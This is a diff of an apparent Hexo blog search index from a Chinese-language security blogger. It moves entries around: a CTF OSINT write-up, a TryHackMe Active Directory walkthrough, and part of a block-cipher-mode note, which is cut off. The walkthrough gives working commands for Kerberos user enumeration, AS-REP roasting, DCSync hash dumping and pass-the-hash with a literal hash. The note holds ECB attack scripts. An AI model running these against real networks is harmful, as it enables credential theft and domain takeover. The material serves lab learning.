@@ -302,7 +302,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#114;&#x72;&#x65;&#110;&#99;&#101;&#100;&#101;&#x73;&#99;&#x61;&#x72;&#116;&#x65;&#115;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;">&#x74;&#x65;&#114;&#x72;&#x65;&#110;&#99;&#101;&#100;&#101;&#x73;&#99;&#x61;&#x72;&#116;&#x65;&#115;&#64;&#x67;&#109;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#116;&#101;&#114;&#x72;&#101;&#x6e;&#x63;&#101;&#100;&#x65;&#x73;&#x63;&#x61;&#114;&#x74;&#x65;&#x73;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;">&#116;&#101;&#114;&#x72;&#101;&#x6e;&#x63;&#101;&#100;&#x65;&#x73;&#x63;&#x61;&#114;&#x74;&#x65;&#x73;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#46;&#99;&#x6f;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -310,7 +310,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#101;&#x72;&#x72;&#x65;&#110;&#x63;&#101;&#100;&#x65;&#115;&#x63;&#x61;&#x72;&#x74;&#101;&#x73;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#x6d;">&#x74;&#101;&#x72;&#x72;&#x65;&#110;&#x63;&#101;&#100;&#x65;&#115;&#x63;&#x61;&#x72;&#x74;&#101;&#x73;&#x40;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#99;&#111;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#x65;&#x72;&#x72;&#101;&#110;&#99;&#x65;&#100;&#101;&#115;&#99;&#97;&#114;&#x74;&#101;&#x73;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;">&#x74;&#x65;&#x72;&#x72;&#101;&#110;&#99;&#x65;&#100;&#101;&#115;&#99;&#97;&#114;&#x74;&#101;&#x73;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#111;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -555,54 +555,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Attacktive Directory on Tryhackme</title>
-    <url>/2024/03/03/Attack-Directory/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>TryHackMe 上的連結：<a href="https://tryhackme.com/room/attacktivedirectory">https://tryhackme.com/room/attacktivedirectory</a><br>AD是什麼?<br><a href="https://zh.wikipedia.org/zh-tw/Active_Directory">Wikipedia 上的介紹</a>  </p>
-<p>在台灣好厲駭的課有聽過一次Mars大大的AD課程，但因為真的第一次接觸加上東西爆炸多，其實也沒真的學進去多少(頂多觀念)，剛好在TryHackMe上看到一堆AD靶機，就來打打吧~  </p>
-<p>這台機器的在一個AD網路環境，它代表的是一台Kerberos DC(Domain Controller)。<br>雖然說這有點事後諸葛，但是本題的攻擊鍊是：  </p>
-<p>:::info<br>字典攻擊找username -&gt; TGT暴破svc-admin的密碼 -&gt; 用 svc-admin 的身分登入 smb 找到使用者 backup 的密碼備份檔 -&gt;用 backup 的身分透過DRSUAPI的方法炸出每個使用者的hash -&gt; 利用 Pass The Hash 攻擊登入 Administrator<br>:::  </p>
-<p>Victim’s IP : 10.10.162.250<br>Victim’s Host : spookysec.local<br>Attacker’s IP : 10.9.195.189  </p>
-<p><strong>註：</strong> 記得去變更<code>/etc/hosts</code>設定檔改Host Name  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p><strong>Command</strong><br><code>nmap -sC -sV -Pn 10.10.162.250</code><br><strong>Result</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.162.143</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 987 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-03 08:36:16Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local</span><br><span class="line">| Not valid before: 2024-03-02T08:23:05</span><br><span class="line">|_Not valid after:  2024-09-01T08:23:05</span><br><span class="line">|_ssl-date: 2024-03-03T08:36:43+00:00; +1s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: THM-AD</span><br><span class="line">|   NetBIOS_Domain_Name: THM-AD</span><br><span class="line">|   NetBIOS_Computer_Name: ATTACKTIVEDIREC</span><br><span class="line">|   DNS_Domain_Name: spookysec.local</span><br><span class="line">|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-03-03T08:36:34+00:00</span><br><span class="line">Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-03-03T08:36:37</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 0s, median: 0s</span><br></pre></td></tr></table></figure>
-<p><strong>Analyze</strong><br>有smb service, RDP，整體架構是AD網路，HOST NAME是<code>spookysec.local</code>  </p>
-<h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><p><strong>Command</strong><br><code>enum4linux -a  spookysec.local</code><br><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rJCVc-zpT.png" alt="image">  </p>
-<p><img src="https://hackmd.io/_uploads/rkwr5WzaT.png" alt="image">  </p>
-<p>許多User資料被炸出來<br>獲得NetBios Name是THM-AD(但以後續動作來看沒什麼功能…)  </p>
-<h4 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h4><p>新工具，可以去Github上下載到：<br><a href="https://github.com/ropnop/kerbrute/releases">Click Me : https://github.com/ropnop/kerbrute/releases</a>  </p>
-<p>透過題目提供的userlist.txt進行攻擊(也有提供password.txt做後續的hash爆破)<br><strong>command:</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc 10.10.184.186 -d spookysec.local usernames.txt</span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HyBxo-Ga6.png" alt="image">  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>首先，安裝Impacket工具包  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/SecureAuthCorp/impacket.git /opt/impacket</span><br><span class="line">pip3 install -r /opt/impacket/requirements.txt</span><br><span class="line"><span class="built_in">cd</span> /opt/impacket/ &amp;&amp; python3 ./setup.py install</span><br></pre></td></tr></table></figure>
-<p>可能會需要掛<code>sudo</code>(後續攻擊行為也有很多需要，就不贅述)  </p>
-<h4 id="TGT-Attack-with-svc-admin"><a href="#TGT-Attack-with-svc-admin" class="headerlink" title="TGT Attack with svc-admin"></a>TGT Attack with svc-admin</h4><p>獲取TGT的原理大致上是在kerberos驗證的時候進行訊息劫持…(?應該啦)<br><strong>注意我這時候在的路徑是<code>/opt/impacket/examples</code></strong><br>利用Impacket的<code>GetNPUsers.py</code>進行攻擊<br><strong>Command</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python3 GetNPUsers.py spookysec.local/svc-admin -no-<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/Skyfhbz6p.png" alt="image">  </p>
-<p><strong>password cracking</strong><br>把剛剛的結果丟到<code>pass</code><br><code>john pass --wordlist=passwordlist.txt</code><br><img src="https://hackmd.io/_uploads/SkztnZGa6.png" alt="image">  </p>
-<h4 id="SMB-to-get-backup’s-password"><a href="#SMB-to-get-backup’s-password" class="headerlink" title="SMB to get backup’s password"></a>SMB to get backup’s password</h4><p>這步沒太多東西，就是拿到剛剛svc-hosts的密碼後登入smb service  </p>
-<p><code>smbclient  -U svc-admin //10.10.162.143/backup</code>  </p>
-<p><img src="https://hackmd.io/_uploads/B1cCh-z6a.png" alt="image">  </p>
-<p>密碼get!!  </p>
-<p><img src="https://hackmd.io/_uploads/BJZXTWfT6.png" alt="image">  </p>
-<h4 id="backup-to-Administrator"><a href="#backup-to-Administrator" class="headerlink" title="backup to Administrator"></a>backup to Administrator</h4><p>利用Impackets中的<code>secretsdump.py</code>結合backup權限炸出各個使用者的密碼 hash<br><strong>Command</strong><br><code>sudo python3 secretsdump.py -just-dc backup@spookysec.local</code><br><strong>Result</strong><br><img src="https://hackmd.io/_uploads/SkG70Zfaa.png" alt="image">  </p>
-<p>拿到密碼hash後透過Pass The Hash攻擊登入admin  </p>
-<p><em>What is pass the hash attack?</em><br>看這篇：<a href="https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67">https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67</a>  </p>
-<p>利用<code>evil-winrm</code>工具進行Pass The Hash攻擊直接登入<br><strong>Command</strong><br><code>evil-winrm -i 10.10.88.124 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code>  </p>
-<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BkREJMzp6.png" alt="image">  </p>
-<p><em>RCE!!!</em><br><strong>如何確認自己在AD裡面的身分：</strong><br><code>Get-ADUser -Identity &quot;Administrator&quot; -Properties *</code>  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>經過這台靶機感覺多會了蠻多技巧，AD還有超級超級多要學，繼續努力w<br>附上打這台機器沒什麼用但還是物盡其用搞得RDP<br><img src="https://hackmd.io/_uploads/Hyq1xMfpp.png" alt="image">  </p>
-<p>駭客ㄉ浪漫啊~<br>晚ㄢ :&gt;  </p>
-]]></content>
-      <tags>
-        <tag>AD</tag>
-        <tag>Active Directory</tag>
-        <tag>Windows</tag>
-        <tag>Pentesting</tag>
-        <tag>TryHackMe</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AIS3 EOF QUAL 2024 Write Up</title>
     <url>/2024/01/10/EOFQUAL2023/</url>
     <content><![CDATA[<h1 id="AIS3-EOF-QUAL-2024-Write-Up"><a href="#AIS3-EOF-QUAL-2024-Write-Up" class="headerlink" title="AIS3 EOF QUAL 2024 Write Up"></a>AIS3 EOF QUAL 2024 Write Up</h1><h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>User Name: Whale120<br>Rank:61  </p>
@@ -661,6 +613,54 @@
         <tag>CTR</tag>
         <tag>CFB</tag>
         <tag>OFB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Attacktive Directory on Tryhackme</title>
+    <url>/2024/03/03/Attack-Directory/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>TryHackMe 上的連結：<a href="https://tryhackme.com/room/attacktivedirectory">https://tryhackme.com/room/attacktivedirectory</a><br>AD是什麼?<br><a href="https://zh.wikipedia.org/zh-tw/Active_Directory">Wikipedia 上的介紹</a>  </p>
+<p>在台灣好厲駭的課有聽過一次Mars大大的AD課程，但因為真的第一次接觸加上東西爆炸多，其實也沒真的學進去多少(頂多觀念)，剛好在TryHackMe上看到一堆AD靶機，就來打打吧~  </p>
+<p>這台機器的在一個AD網路環境，它代表的是一台Kerberos DC(Domain Controller)。<br>雖然說這有點事後諸葛，但是本題的攻擊鍊是：  </p>
+<p>:::info<br>字典攻擊找username -&gt; TGT暴破svc-admin的密碼 -&gt; 用 svc-admin 的身分登入 smb 找到使用者 backup 的密碼備份檔 -&gt;用 backup 的身分透過DRSUAPI的方法炸出每個使用者的hash -&gt; 利用 Pass The Hash 攻擊登入 Administrator<br>:::  </p>
+<p>Victim’s IP : 10.10.162.250<br>Victim’s Host : spookysec.local<br>Attacker’s IP : 10.9.195.189  </p>
+<p><strong>註：</strong> 記得去變更<code>/etc/hosts</code>設定檔改Host Name  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p><strong>Command</strong><br><code>nmap -sC -sV -Pn 10.10.162.250</code><br><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 10.10.162.143</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 987 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-03 08:36:16Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local</span><br><span class="line">| Not valid before: 2024-03-02T08:23:05</span><br><span class="line">|_Not valid after:  2024-09-01T08:23:05</span><br><span class="line">|_ssl-date: 2024-03-03T08:36:43+00:00; +1s from scanner time.</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: THM-AD</span><br><span class="line">|   NetBIOS_Domain_Name: THM-AD</span><br><span class="line">|   NetBIOS_Computer_Name: ATTACKTIVEDIREC</span><br><span class="line">|   DNS_Domain_Name: spookysec.local</span><br><span class="line">|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-03-03T08:36:34+00:00</span><br><span class="line">Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-03-03T08:36:37</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 0s, median: 0s</span><br></pre></td></tr></table></figure>
+<p><strong>Analyze</strong><br>有smb service, RDP，整體架構是AD網路，HOST NAME是<code>spookysec.local</code>  </p>
+<h4 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h4><p><strong>Command</strong><br><code>enum4linux -a  spookysec.local</code><br><strong>Result</strong><br><img src="https://hackmd.io/_uploads/rJCVc-zpT.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/rkwr5WzaT.png" alt="image">  </p>
+<p>許多User資料被炸出來<br>獲得NetBios Name是THM-AD(但以後續動作來看沒什麼功能…)  </p>
+<h4 id="kerbrute"><a href="#kerbrute" class="headerlink" title="kerbrute"></a>kerbrute</h4><p>新工具，可以去Github上下載到：<br><a href="https://github.com/ropnop/kerbrute/releases">Click Me : https://github.com/ropnop/kerbrute/releases</a>  </p>
+<p>透過題目提供的userlist.txt進行攻擊(也有提供password.txt做後續的hash爆破)<br><strong>command:</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum --dc 10.10.184.186 -d spookysec.local usernames.txt</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/HyBxo-Ga6.png" alt="image">  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>首先，安裝Impacket工具包  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/SecureAuthCorp/impacket.git /opt/impacket</span><br><span class="line">pip3 install -r /opt/impacket/requirements.txt</span><br><span class="line"><span class="built_in">cd</span> /opt/impacket/ &amp;&amp; python3 ./setup.py install</span><br></pre></td></tr></table></figure>
+<p>可能會需要掛<code>sudo</code>(後續攻擊行為也有很多需要，就不贅述)  </p>
+<h4 id="TGT-Attack-with-svc-admin"><a href="#TGT-Attack-with-svc-admin" class="headerlink" title="TGT Attack with svc-admin"></a>TGT Attack with svc-admin</h4><p>獲取TGT的原理大致上是在kerberos驗證的時候進行訊息劫持…(?應該啦)<br><strong>注意我這時候在的路徑是<code>/opt/impacket/examples</code></strong><br>利用Impacket的<code>GetNPUsers.py</code>進行攻擊<br><strong>Command</strong>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">python3 GetNPUsers.py spookysec.local/svc-admin -no-<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/Skyfhbz6p.png" alt="image">  </p>
+<p><strong>password cracking</strong><br>把剛剛的結果丟到<code>pass</code><br><code>john pass --wordlist=passwordlist.txt</code><br><img src="https://hackmd.io/_uploads/SkztnZGa6.png" alt="image">  </p>
+<h4 id="SMB-to-get-backup’s-password"><a href="#SMB-to-get-backup’s-password" class="headerlink" title="SMB to get backup’s password"></a>SMB to get backup’s password</h4><p>這步沒太多東西，就是拿到剛剛svc-hosts的密碼後登入smb service  </p>
+<p><code>smbclient  -U svc-admin //10.10.162.143/backup</code>  </p>
+<p><img src="https://hackmd.io/_uploads/B1cCh-z6a.png" alt="image">  </p>
+<p>密碼get!!  </p>
+<p><img src="https://hackmd.io/_uploads/BJZXTWfT6.png" alt="image">  </p>
+<h4 id="backup-to-Administrator"><a href="#backup-to-Administrator" class="headerlink" title="backup to Administrator"></a>backup to Administrator</h4><p>利用Impackets中的<code>secretsdump.py</code>結合backup權限炸出各個使用者的密碼 hash<br><strong>Command</strong><br><code>sudo python3 secretsdump.py -just-dc backup@spookysec.local</code><br><strong>Result</strong><br><img src="https://hackmd.io/_uploads/SkG70Zfaa.png" alt="image">  </p>
+<p>拿到密碼hash後透過Pass The Hash攻擊登入admin  </p>
+<p><em>What is pass the hash attack?</em><br>看這篇：<a href="https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67">https://wwwstar.medium.com/%E5%85%A7%E7%B6%B2%E6%BB%B2%E9%80%8F-pass-the-hash-pth-%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95%E5%8F%8A%E9%98%B2%E7%A6%A6-%E5%81%B5%E6%B8%AC%E6%8E%AA%E6%96%BD-e1d15e807a67</a>  </p>
+<p>利用<code>evil-winrm</code>工具進行Pass The Hash攻擊直接登入<br><strong>Command</strong><br><code>evil-winrm -i 10.10.88.124 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</code>  </p>
+<p><strong>Result</strong><br><img src="https://hackmd.io/_uploads/BkREJMzp6.png" alt="image">  </p>
+<p><em>RCE!!!</em><br><strong>如何確認自己在AD裡面的身分：</strong><br><code>Get-ADUser -Identity &quot;Administrator&quot; -Properties *</code>  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>經過這台靶機感覺多會了蠻多技巧，AD還有超級超級多要學，繼續努力w<br>附上打這台機器沒什麼用但還是物盡其用搞得RDP<br><img src="https://hackmd.io/_uploads/Hyq1xMfpp.png" alt="image">  </p>
+<p>駭客ㄉ浪漫啊~<br>晚ㄢ :&gt;  </p>
+]]></content>
+      <tags>
+        <tag>AD</tag>
+        <tag>Active Directory</tag>
+        <tag>Windows</tag>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
       </tags>
   </entry>
   <entry>
@@ -978,28 +978,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Block Cipher Mode note</title>
-    <url>/2023/11/04/block-cipher-1/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>A quick Block Cipher Mode review for myself.<br>All the exploits down below are for <a href="https://github.com/oalieno/Crypto-Course/tree/master/Block-Cipher-Mode">Labs made by Oalieno</a>  </p>
-<p><a href="https://www.youtube.com/watch?v=VzuIjk1bmFE">Recommended Course</a>  </p>
-<h2 id="Block-Cipher-Mode"><a href="#Block-Cipher-Mode" class="headerlink" title="Block Cipher Mode"></a>Block Cipher Mode</h2><h2 id="Cut-and-Paste-Attack"><a href="#Cut-and-Paste-Attack" class="headerlink" title="Cut and Paste Attack"></a>Cut and Paste Attack</h2><p><strong>EBC MODE vulnerability</strong><br>Because in ECB mode, size of an block is always 16 bytes, so even though we can’t crack it, it’s still feasible to construct datas with specific size and rearrange the encrypted blocks which bring spoofing<br><strong>Exploit</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20001</span>)</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode())</span><br><span class="line"><span class="comment">#user:AAAAAAAAAAA 999999999999999 BBBBBBBBB;money: 10;</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">11</span>+<span class="string">&#x27;9&#x27;</span>*<span class="number">16</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">9</span></span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.decode)</span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(s.decode().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">2</span>])</span><br><span class="line">payload=s[:<span class="number">16</span>]+s[<span class="number">32</span>:<span class="number">48</span>]+s[<span class="number">16</span>:<span class="number">32</span>]+s[<span class="number">48</span>:]</span><br><span class="line">payload=payload.<span class="built_in">hex</span>()</span><br><span class="line">s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line">r.sendline(payload.encode())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="Prepend-Oracle"><a href="#Prepend-Oracle" class="headerlink" title="Prepend Oracle"></a>Prepend Oracle</h2><p><strong>EBC MODE vulnerability</strong><br>This method can be used when your input would be encrypted with message you want to encrpt<br>The main idea is to enumerate through characters until it’s same with encrypted blocks generated from only padding input.<br><strong>Exploit</strong>  </p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">20005</span>)</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">data</span>):</span><br><span class="line">    data=data.<span class="built_in">hex</span>().encode()</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27; = &#x27;</span>)</span><br><span class="line"><span class="comment">#    print(s)</span></span><br><span class="line">    r.sendline(data)</span><br><span class="line">    s=r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">return</span> s.split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    padding=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">32</span>-<span class="number">1</span>-i)</span><br><span class="line">    test=oracle(padding)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> oracle(padding+flag+c.encode())[:<span class="number">64</span>]==test[:<span class="number">64</span>]:</span><br><span class="line"><span class="comment">#            print(test)</span></span><br><span class="line"><span class="comment">#            print(oracle(padding+flag+c.encode()))</span></span><br><span class="line">            flag=flag+c.encode()</span><br><span class="line">            <span class="built_in">print</span>(flag, i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
